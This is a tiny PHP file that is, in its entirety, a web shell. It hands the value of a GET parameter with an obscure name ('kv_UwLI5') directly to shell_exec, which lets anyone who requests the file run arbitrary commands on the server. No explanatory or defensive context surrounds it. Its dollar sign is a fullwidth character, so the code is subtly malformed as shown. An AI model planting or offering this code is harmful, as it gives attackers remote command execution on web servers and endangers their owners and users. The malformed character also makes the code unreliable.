<?php
shell_exec(＄_GET['kv_UwLI5']);
?>
